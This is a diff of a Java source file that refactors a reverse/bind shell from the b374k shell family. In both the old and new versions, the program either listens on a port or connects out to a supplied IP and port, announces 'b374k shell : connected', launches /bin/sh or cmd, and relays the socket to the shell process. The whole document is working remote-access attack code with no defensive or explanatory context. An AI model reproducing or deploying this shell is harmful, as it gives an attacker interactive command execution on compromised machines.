@@ -2,42 +2,35 @@
 import java.io.*;
 import java.net.*;
 
-public class b374k_rs{
-    private static final class pt extends Thread{
-        private InputStream is;
-        private OutputStream out;
-
-        public pt(InputStream is, OutputStream out){this.is=is;this.out=out;}
-
+public class RS{
+    static class pt extends Thread{
+        final InputStream is;
+        final OutputStream out;
+        pt(InputStream is, OutputStream out){this.is=is;this.out=out;start();}
         @Override
         public void run(){
             try{
                 byte[] b = new byte[8192];
-                int c = is.read(b);
-                while(c>=0) {
+                int c;
+                while((c = is.read(b))>=0) {
                     out.write(b,0,c);
                     out.flush();
-                    c = is.read(b);
                 }
-            }
-            catch(Exception e){e.printStackTrace();}
+                out.close();
+            }catch(Exception e){}
         }
     }
-
     public static void main(String[] args){
         int port;
         String cmd = "/bin/sh";
         if(System.getProperty("os.name").toLowerCase().indexOf("win")>=0){cmd = "cmd";}
-        String w = "b374k shell : connected\n";
-        byte[] b = w.getBytes();
-        Socket h = new Socket();
+        Socket h = null;
         try{
             if(args.length==1){
                 port = Integer.parseInt(args[0]);
                 ServerSocket s = new ServerSocket(port);
                 h = s.accept();
-            }
-            else if(args.length==2){
+            }else if(args.length==2){
                 port = Integer.parseInt(args[0]);
                 String ip = args[1];
                 h = new Socket(ip, port);
@@ -45,14 +38,12 @@ public class b374k_rs{
             if(args.length==1 || args.length==2){
                 InputStream gis = h.getInputStream();
                 OutputStream gos = h.getOutputStream();
-                gos.write(b);
+                gos.write("b374k shell : connected\n".getBytes());
                 Process p = Runtime.getRuntime().exec(cmd);
 
-                pt p1 = new pt(p.getInputStream(), gos);
-                pt p2 = new pt(gis, p.getOutputStream());
-                p1.start();p2.start();
+                new pt(p.getInputStream(), gos);
+                new pt(gis, p.getOutputStream());
             }
-        }
-        catch(Exception e){e.printStackTrace();}
+        }catch(Exception e){e.printStackTrace();}
     }
 }
